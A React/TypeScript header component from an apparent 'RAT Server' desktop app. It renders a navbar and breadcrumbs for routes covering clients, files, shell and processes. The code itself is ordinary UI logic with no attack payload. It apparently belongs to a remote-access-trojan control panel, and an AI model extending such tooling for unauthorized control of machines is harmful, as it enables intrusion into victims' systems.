import React, { useState, useEffect, useContext } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { RATContext } from "../rat/RATContext";
import logo512 from "../../src-tauri/icons/512x512.png";

export interface Segment {
  text: string;
  isNumber: boolean;
}

export const Header: React.FC = () => {
  const [pathSegments, setPathSegments] = useState<Segment[]>([]);
  const { selectedClient } = useContext(RATContext)!;

  const location = useLocation();
  const navigate = useNavigate();

  useEffect(() => {
    const segments = location.pathname.split("/").filter(Boolean);
    const capitalizedSegments = segments.map((segment) => ({
      text: capitalizeFirstLetter(segment),
      isNumber: isNumeric(segment),
    }));

    setPathSegments(capitalizedSegments);
  }, [location]);

  // Function to capitalize the first letter of a string
  function capitalizeFirstLetter(string: string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
  }

  // Function to check if a string is numeric
  function isNumeric(value: string) {
    return !isNaN(parseFloat(value.toString())) && !isNaN(parseFloat(value));
  }

  function handleNavigate(page: string) {
    if (page === "/Files" || page === "/Shell" || page == "/Process") {
      return;
    }
    navigate(page.toLowerCase());
  }

  return (
    <div className="navbar bg-base-300 border-b border-base-content">
      <div className="navbar-start">
        <a target="_blank">
          <img
            src={logo512}
            className="logo tauri"
            alt="Tauri logo"
            width="50px"
          />
        </a>
        <h1 className="text-lg font-bold pl-4">RAT Server</h1>
      </div>
      <div className="navbar-center">
        <div className="input border bg-base-200 border-base-content">
          <div className="text-sm breadcrumbs">
            <ul className="text-lg hover:cursor-default">
              <li>Server</li>
              {pathSegments.map((segment, index) => (
                <li key={index}>
                  {segment.isNumber ? (
                    <a
                      className="hover:cursor-pointer"
                      onClick={() => handleNavigate(`/clients/${segment.text}`)}
                      key={index}
                    >
                      [{segment.text}] {selectedClient}
                    </a>
                  ) : (
                    <a
                      className="hover:cursor-pointer"
                      onClick={() => handleNavigate(`/${segment.text}`)}
                      key={index}
                    >
                      {segment.text}
                    </a>
                  )}
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>
      <div className="navbar-end"></div>
    </div>
  );
};
